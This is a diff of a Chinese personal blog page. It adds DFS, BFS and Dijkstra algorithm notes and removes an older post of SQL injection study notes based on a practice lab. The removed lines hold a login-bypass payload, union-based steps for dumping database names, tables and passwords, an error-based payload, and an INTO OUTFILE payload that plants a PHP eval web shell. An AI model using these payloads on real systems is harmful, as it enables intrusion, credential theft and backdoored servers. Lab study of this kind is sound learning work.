@@ -118,6 +118,65 @@
     
     
     <article
+  id="post-搜索与图论"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2021/04/10/%E6%90%9C%E7%B4%A2%E4%B8%8E%E5%9B%BE%E8%AE%BA/"
+    >搜索与图论</a> 
+</h2>
+ 
+
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2021/04/10/%E6%90%9C%E7%B4%A2%E4%B8%8E%E5%9B%BE%E8%AE%BA/" class="article-date">
+  <time datetime="2021-04-10T08:29:24.415Z" itemprop="datePublished">2021-04-10</time>
+</a>    
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="搜索与图论"><a href="#搜索与图论" class="headerlink" title="搜索与图论"></a><strong>搜索与图论</strong></h1><p>学习内容：DFS, BFS, Dijstra ford,spfa,Floyd,prim,kuuskal算法，图论。<a herf="https://www.acwing.com/activity/content/11/">点击这里开始学习。</a></p>
+<h3 id="一、深度优先搜索"><a href="#一、深度优先搜索" class="headerlink" title="一、深度优先搜索"></a>一、深度优先搜索</h3><p>​    递归实现深度优先搜索，适用于全排列。<a herf="https://www.acwing.com/problem/content/845/">著名问题有n-皇后问题。</a></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">/*结束条件*/</span></span><br><span class="line">    <span class="keyword">for</span>()&#123;<span class="comment">/*遍历下一个*/</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="comment">/*筛选条件*/</span>)&#123;</span><br><span class="line">            <span class="comment">/*改变现场*/</span></span><br><span class="line">        	dfs();</span><br><span class="line">            <span class="comment">/*恢复现场*/</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="二、广度优先搜索"><a href="#二、广度优先搜索" class="headerlink" title="二、广度优先搜索"></a>二、广度优先搜索</h3><p>​    通过队列实现每一级的搜索，可以解决最短路的问题。比如<a herf="https://www.acwing.com/problem/content/847/">走迷宫</a>，华容道问题。遍历每一个结点，然后由结点产生下一个结点。判断该点是否符合题意</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bfs</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">queue</span>&lt;<span class="keyword">int</span>&gt; q;</span><br><span class="line">    <span class="keyword">while</span>(<span class="comment">/*遍历结点一般是q.size()*/</span>)&#123;</span><br><span class="line">    	<span class="keyword">int</span> t=q.fornt();</span><br><span class="line">        q.pop();</span><br><span class="line">        <span class="keyword">if</span>(<span class="comment">/*判断t能否符合题意*/</span>)</span><br><span class="line">        <span class="keyword">for</span>(<span class="comment">/*遍历t能产生的结点*/</span>) </span><br><span class="line">            <span class="comment">/*加入队列*/</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="三、Dijkstra算法"><a href="#三、Dijkstra算法" class="headerlink" title="三、Dijkstra算法"></a>三、Dijkstra算法</h3><pre><code>先找到距离顶点最短且没有被标记的点，用该点更新所有的点，把改点当成中间点，标记该点。时间复杂度O(mlog(n))
+d[v]表示v到根的的距离
+if (d[v] &gt; d[u] + g[u][v] &amp;&amp; g[u][v] != INF) 
+            d[v] = d[u] + g[u][v];</code></pre><p>​    </p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+    </footer>
+  </div>
+
+    
+ 
+   
+</article>
+
+    
+    <article
   id="post-算法笔记"
   class="article article-type-post"
   itemscope
@@ -483,74 +542,6 @@ def quicks(li):
     else:
         return li</code></p>
 <p>我感觉就选择排序最简单，最好记，我简化了一下。其他的排序算法太难记了，我看的头大。</p>
- 
-      <!-- reward -->
-      
-    </div>
-    
-
-    <!-- copyright -->
-    
-    <footer class="article-footer">
-       
-    </footer>
-  </div>
-
-    
- 
-   
-</article>
-
-    
-    <article
-  id="post-sql注入"
-  class="article article-type-post"
-  itemscope
-  itemprop="blogPost"
-  data-scroll-reveal
->
-  <div class="article-inner">
-    
-    <header class="article-header">
-       
-<h2 itemprop="name">
-  <a class="article-title" href="/2020/09/04/sql%E6%B3%A8%E5%85%A5/"
-    >sql注入</a> 
-</h2>
- 
-
-    </header>
-     
-    <div class="article-meta">
-      <a href="/2020/09/04/sql%E6%B3%A8%E5%85%A5/" class="article-date">
-  <time datetime="2020-09-04T08:12:16.322Z" itemprop="datePublished">2020-09-04</time>
-</a>    
-    </div>
-      
-    <div class="article-entry" itemprop="articleBody">
-       
-  <h1 id="sql注入の初见"><a href="#sql注入の初见" class="headerlink" title="sql注入の初见"></a>sql注入の初见</h1><p>首先你要学会数据库的语法和特性。比如一个简单的表单，<img src="https://raw.githubusercontent.com/rao2357/picgo/master/IMG%5Cimage-20200904162506105.png" alt="image-20200904162506105"></p>
-<p>在输入正确的账号和密码后，会进入另一个页面，我们可以使用一个特殊的用户“ ‘or 1=1– “ 我们就可以进入了，我们可以看一下代码<img src="https://raw.githubusercontent.com/rao2357/picgo/master/IMG%5Cimage-20200904172351374.png" alt="image-20200904172351374"></p>
-<p>我们可以知道sql执行的语句是 </p>
-<p><code>select *from admin where username=&#39;&#39; or 1=1--&#39;and password=&#39;&#39;</code></p>
-<p>可知返回的值<del>恒为真</del> 大于0，自然可以进入。</p>
-<h1 id="MySQL基本注入："><a href="#MySQL基本注入：" class="headerlink" title="MySQL基本注入："></a>MySQL基本注入：</h1><p>1.判断注入类型，表单加上’  在加 ‘and 1=1–+ 和 ’and 1=2–+ 看看</p>
-<p>2.判断列数，用 order ,(为了下一步准备)</p>
-<p>3.判断回显位置，用union select 1,2,3…..，列数具体看（2）。这个是一般由网页回显，不过要输入不存在的表单值</p>
-<p>4.查看当前数据库名 ，将select database()插入会回显的位置，不过要输入不存在的表单值</p>
-<p>5.查看数据库版本，将 select version()插入会回显的位置</p>
-<p>6.列出数据库名，将 select group_concat(schema_name) from information_schema.schemata 插入会回显的位置</p>
-<p>7.列出你要的库的表，将select group_concat(table_name) from information_schema.tables where table_schema=’库名’插入会回显的位置</p>
-<p>8.列出你要的表的字段名，将select group_concat(column_name) from information_schema.columns where table_name=’表名’插入会回显的位置</p>
-<p>9.列出user和password, 将select group_cocat(字段名) from 库名.表名  和 select group_concat(字段名) from 库名.表名 插入会回显的位置即可</p>
-<p>以上一般要注释符 – ，但是空格在url末尾会去掉,用–+，+在URL中有特殊含义为空格，或者可以用– x，x随便，x可以保证空格存在。</p>
-<h1 id="MySQL显错注入："><a href="#MySQL显错注入：" class="headerlink" title="MySQL显错注入："></a>MySQL显错注入：</h1><p>1.updatexml()</p>
-<p>select name from user where id=1 and updatexml(1,concat(‘<del>‘,(select database()),’</del>‘),3);</p>
-<h1 id="MySQL-dump-into-outfile"><a href="#MySQL-dump-into-outfile" class="headerlink" title="MySQL dump into outfile:"></a>MySQL dump into outfile:</h1><p>生成一个php文件，可以用蚁剑连接， 比如构造一个这个</p>
-<p>union select 1,(select group_concat(username) from security.users),’<?php @eval($_POST["aaa"]);?>‘ into outfile ‘D:\phpstudy_pro\WWW\sqli-labs-master\Less-7\data.php’–+</p>
-<p>把’<?php @eval($_POST["aaa"]);?>‘放入data.php中，便于蚁剑连接，aaa就是密码，可以在data.php中看到回显内容</p>
-<h2 id="记录一些绕过姿势"><a href="#记录一些绕过姿势" class="headerlink" title="记录一些绕过姿势"></a>记录一些绕过姿势</h2><h3 id="一、过滤空格"><a href="#一、过滤空格" class="headerlink" title="一、过滤空格"></a>一、过滤空格</h3><p>（1）、/**/</p>
-<p>（2）、（）比如and(1=1)</p>
  
       <!-- reward -->
       
